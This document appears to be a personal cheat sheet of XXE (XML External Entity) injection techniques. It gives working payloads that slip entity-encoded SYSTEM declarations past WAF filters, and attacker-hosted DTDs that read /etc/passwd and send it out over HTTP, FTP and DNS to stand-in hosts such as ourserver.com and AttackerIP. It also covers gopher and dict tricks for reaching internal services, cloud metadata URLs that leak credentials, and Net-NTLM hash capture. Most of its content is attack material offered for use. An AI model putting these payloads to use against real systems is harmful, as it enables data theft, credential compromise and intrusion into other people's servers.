# XXE-Notes

### WAF bypass

A useful technique to bypass WAF forbidden words like SYSTEM is using html entities, the technique here can be used to avoid using blacklisted words.

This is also valid for a regex in this case we will bypass the following regex `/<!(?:DOCTYPE|ENTITY)(?:\s|%|&#[0-9]+;|&#x[0-9a-fA-F]+;)+[^\s]+\s+(?:SYSTEM|PUBLIC)\s+[\'\"]/im`

This regex is stopping us to create a external entity with the following structure: 

`<!ENTITY file SYSTEM "file:///path/to/file">` 
To avoid this we are going to use html entities to encode `<!ENTITY % dtd SYSTEM "http://ourserver.com/bypass.dtd" >` so we can call our dtd in a server we control.

The html entity equivalent is `&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x64;&#x74;&#x64;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x20;&#x3E;`

The idea here is to use this entity to bypass the SYSTEM word to call our controlled dtd. This way we only have to bypass the WAF/REGEX one time and we can craft any entity we need on our dtd.

#### Server payload

We have to serve our dtd like the following:
```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://ourserver.com/bypass.xml?%data;'>">
%abt;
```
We can modify this payload as we need as this will not be blocked by the WAF or regex on the victim.

#### Stager payload
The following payload will call our external dtd bypassing the SYSTEM blacklisted word:
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x64;&#x74;&#x64;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x20;&#x3E;" >%a;%dtd;]><data><env>&exfil;</env></data>
```

And all we need to do is sending the payload and wait for the exfil in our server
![Bypass ](img/exfil.png)
And we can see is the base64 of the /etc/passwd

#
#
#

XXE - XML External ENTITY Injection
XML - Extenstible Markup language
XML is a well structured document which is used to store information and used as a dataset definition. In XML we can also define schema of the elements, use nested data elements, fetch out those details using an XML parser.

For example:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [
<!ELEMENT users (user)+>
<!ELEMENT user (id,username,password)>
<!ELEMENT id (#PCDATA)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
  ]>
<users>
	<user>
		<id>1</id>
		<username>Rahul</username>
		<password>$%@#!@%xzcv5354</password>
	</user>
	<user>
		<id>2</id>
		<username>Faraz</username>
		<password>j@ff@0ck$l</password>
	</user>
	<user>
		<id>3</id>
		<username>Armaan</username>
		<password>armaan</password>
	</user>
</users>
HTML
The above XML have a DTD defined where the data type for the XML is defined. The whole DTD can also be defined in an external file. There is something called "ENTITIES" in DTD which could be used for substituion of text.
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [
<!ENTITY x "Faraz" >
<!-- Here "x" is the entity name which is nothing but the substituion for the string "Faraz" -->
]>
<users>
	<user>
		<id>2</id>
		<username>&x;</username> <!-- here the entity "x" is a variable storing the value "Faraz"-->
		<password>$%@#!@%xzcvs546345354</password>
	</user>
</users>
HTML
The ENTITIES could be used to define DTDs in an external file which could be a relative URL or an external URL. This is where XXE comes in. Having external DTD allows an attacker to make an external request from server side, which is done using the "SYSTEM" keyword followed by the path or the URL of external DTD file.
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [
<!ENTITY x SYSTEM "http://securityidiots/evil.dtd" >
]>
<users>
	<user>
		<id>2</id>
		<username>&x;</username> <!-- here the entity "x" is calling our external entity-->
		<password>$%@#!@%xzcvs546345354</password>
	</user>
</users>
	
HTML
These Entities could only be substituted inside the XML structure. However, there is something called parameter entities which could be defined as well as called inside the DOCTYPE itself. They are denoted by "% " followed by entity name.
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE users [
	<!ENTITY % x SYSTEM "http://securityidiots/evil.dtd" > %x; <!-- The Entity "x" is called over here only -->
	]>
	<users>
		<user>
			<id>2</id>
			<username>Faraz</username>
			<password>$%@#!@%xzcvs546345354</password>
		</user>
	</users>
HTML
Types of XXE Scenarios (Different types of scenarios that you may encounter)

Response based XXE - When the Injected request is giving data in response.
Error Based XXE - When there is no response from the XML entities but we are able to view the response by triggering errors.
Blind XXE - When there is no error nor response, but XML is getting parsed at server side.

XXE Injection Sources - File/Input sources that an attacker could use to inject his malicious XML.
XML
PPT(X)
XLS(X)
PDF
ODT
DOC(X)
SSRF
GPX
SAML
SVG
JSON TO XML Modification
Feed.RSS
XSD (XML Schema Defination)
XMP
WAP
XSLT

Exploitable Protocols
As, we can use http protocol to retreive our external DTD file, we may be able to use protocols other than HTTP depending on the XML Parser Library and the Server Side Language. Protocols which could help us further exploit the XXE Injection are:

File: could be used to read local file on the server
	file:///etc/passwd

HTTP(s): useful in OOB Data Exfiltration
	http(s)://securityidiots.com/lol.xml

FTP: useful in OOB Data Exfiltration & hitting the internal FTP service which is behind NAT
	ftp://securityidiots.com/lol.xml

SFTP: hitting the internal SFTP service which is behind NAT
	sftp://securityidiots.com:11111/

TFTP: hitting the internal TFTP service which is behind NAT
	tftp://securityidiots.com:12346/lol.xml

DICT : could also be used to make requests to internal services
	dict://ip:22/_XXX
	dict://ip:6379/_XXX

NETDOC: This could be used as an alternative to file in JAVA based Servers.
	netdoc:/etc/passwd

LDAP: could be used to query internal LDAP Service.
	ldap://localhost:11211/%0astats%0aquit

GOPHER:
	gopher://<host>:<port>/_<gopher-path>
	gopher://<host>:25/%0AHELO ... (executing commands on internal SMTP Service)

	Making internal HTTP Requests(GET,POST..etc):
	gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
	gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body

PHP: if PHP is installed we can use PHP Wrappers to read PHP source codes as Base64 content.
	php://filter/convert.base64-encode/resource=index.php

Data:
	data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk
	
HTML
Exploitation Methods:
Methods that you can use to increase the impact of your XXE and convert the SSRF to something useful.


Stealing Net NTLM Hashes : file://attacker's remote IP Running Responder
	1. Run responder on Attacker's server which turns on the SMB Server.
	2. Use file://attackercontrolled.com/xyz.txt which inturn would try to authenticate using NET-NTLM Credentials with attacker's SMB Server ran by Responder and we get the Net-NTML Hashes which we could crack offline.

PORT Scanning
	1. Differentiate Open/Closed ports based on response content or response time.

Internal Network Mapping.
	1. Differentiate existing/nonexisting IPs based on response content or response time.

Metadata API :
Usually applications are hosted on cloud based services such as Google, Digital Ocean, Alibaba, Amazon etc. These cloud providers also provides API endpoints which can be used to interact with the configuration, information extraction using these endpoints. Here is a list of few providers and their Metadata API.

Google, Digital Ocean, Alibaba, Amazon, Kubernetes, Docker, Azure
Amazon :
	http://169.254.169.254/latest/meta-data/
	http://169.254.169.254/latest/meta-data/iam/security-credentials/{rolename} Leaks AWS Credentials which can give read/write access to buckets/EC2 instances leading to RCE
	http://169.254.169.254/latest/meta-data/hostname
	http://169.254.169.254/latest/user-data
Google :
	http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
	http://169.254.169.254/computeMetadata/v1/
	http://metadata.google.internal/computeMetadata/v1/
	http://metadata/computeMetadata/v1/
	http://metadata.google.internal/computeMetadata/v1/instance/hostname
	http://metadata.google.internal/computeMetadata/v1/instance/id
	http://metadata.google.internal/computeMetadata/v1/project/project-id
Digital Ocean :
	http://169.254.169.254/metadata/v1.json
	http://169.254.169.254/metadata/v1/
	http://169.254.169.254/metadata/v1/id
	http://169.254.169.254/metadata/v1/user-data
	http://169.254.169.254/metadata/v1/hostname
	http://169.254.169.254/metadata/v1/region
Alibaba :
	http://100.100.100.200/latest/meta-data/
	http://100.100.100.200/latest/meta-data/instance-id
	http://100.100.100.200/latest/meta-data/image-id
Kubernetes :
	https://kubernetes.default.svc.cluster.local
	https://kubernetes.default
Docker :
	http://127.0.0.1:2375/v1.24/containers/json
Azure :
	http://169.254.169.254/metadata/instance?api-version=2017-04-02
	http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
Packetcloud:
	https://metadata.packet.net/userdata
OpenStack/RackSpace  :
	http://169.254.169.254/openstack
HTML
References:
https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

Out of Band Exploitation
Data extraction using DNS,FTP,HTTP etc.

1. Over FTP:

in Java 1.5+ you can't send data having non printable characters such as newlines,carriage returns etc. over HTTP. However, sending it over FTP is not an issue, an attacker can just setup a FTP server and listen for the incoming data.

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [
<!ENTITY % x SYSTEM "http://securityidiots/evil.dtd" > %x; %param1;
]>
<users>
	<user>
		<id>2</id>
		<username>&exfil;</username>
		<password>$%@#!@%xzcvs546345354</password>
	</user>
</users>
HTML
External DTD to Host evil.dtd:

<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://AttackerIP:2222/%data;'>">
HTML
Ref: https://skavans.ru/en/2017/12/02/xxe-oob-extracting-via-httpftp-using-single-opened-port/

2. Over DNS:

We may not be able to completely exfiltrate the files However, we can fetch partial contents.
For this technique to work, you must be able to upload a file having your evil DTD contents, on the vulnerable server.

Upload the file with following contents:

<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM '%data;.attacker.com'>">
HTML
and in your XXE payload use the relative path to the uploaded DTD

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [
<!ENTITY % x SYSTEM "../../u/securityidiots/uploads/evil.dtd" > %x; %param1;
]>
<users>
	<user>
		<id>2</id>
		<username>&exfil;</username>
		<password>$%@#!@%xzcvs546345354</password>
	</user>
</users>
HTML
and in your DNS Server log all the wildcard DNS resolutions to read the input passed via out XXE Injection.

OOB not allowed:

Content Spoofing on domain/subdomain:
	There may be cases where OOB HTTP is not allowed and you are able to find a way to save or control the contents on some page on the vulnerable application. One could write his evil DTD and use it with relative path to exploit the XXE over DNS.
File Upload on Domain/Subdomain:
	If OOB HTTP is not allowed and only a few whitelisted domains are allowed. In that case you can look for unrestricted file upload on the application or subdomains of the vulnerable application and host the DTD file there itself then we can exfiltrate data over DNS.

SSRF on Domain/Subdomain:
	If we manage to find a GET based full response SSRF over some whitelisted domains where we can control the whole content on the page. We can use it to exploit XXE over DNS.
Internal Local DTD includes:
	This is a very neat trick which can help to exploit XXE in worst cases using internal DTD files on the server.
HTML
Reference:
https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation

Exploitable Services

Redis: Port 6379
		-https://maxchadwick.xyz/blog/ssrf-exploits-against-redis
		-https://dzmitry-savitski.github.io/2018/07/redis-ssrf-exploits-without-new-line

HashiCorp Consul: Port 8500
		-https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html

In case of Response based XXE, we can use unauthenticated DB API calls such as Couch DB API, Mongo DB.
		- https://www.netsparker.com/blog/web-security/exploiting-csrf-vulnerability-mongodb-rest-api/
		- https://hackerone.com/reports/398641

Memcached - Port 11211
		- https://medium.com/@d0znpp/ssrf-memcached-and-other-key-value-injections-in-the-wild-c8d223bd856f11211

Zabbix - Port 10050
		- https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit (Zabbix Agentd)

Solr- Port 8983
		- https://github.com/artsploit/solr-injection
HTML
Also check out this great tool for exploiting such services: https://github.com/tarunkant/Gopherus using gopher://

XXE WAF Bypass
<!ENTITY xxe SYSTEM "URL"> Usually "SYSTEM" keyword is blocked by many WAFs, In such case you can use "PUBLIC" keyword as an alternative which has helped to bypass WAFs and Exploit XXEs as SYSTEM and PUBLIC are practically synonyms

Using "PUBLIC" or Parameter Entities

<!ENTITY % xxe PUBLIC "Random Text" "URL">
HTML
General Entites:

<!ENTITY xxe PUBLIC "Any TEXT" "URL">
HTML
change encoding for example on UTF-16, UTF-7, etc.

<?xml version="1.0" encoding="UTF-16"?> and then you can put the content of XML as of UTF-16 character set which would not be detected by WAFs.
HTML
tampering with doctype/entity names (XXE payloads):
<!DOCTYPE :. SYSTEM "http://"
<!DOCTYPE :_-_: SYSTEM "http://"
<!DOCTYPE {0xdfbf} SYSTEM "http://"
Remove <?xml version="1.0" encoding="UTF-16"?>
This is has worked for me numerous times as many WAF blocks "<?xml" or just "<?" together. However, removing doesn't cause issue with the parsers usually.
HTML
Adding space before the protocol

 <!DOCTYPE :. SYTEM " http://evil.com/1.dtd"
HTML
Use netdoc:/ in place of file:///

<!ENTITY % data SYSTEM "netdoc:/etc/passwd">
HTML
Labs
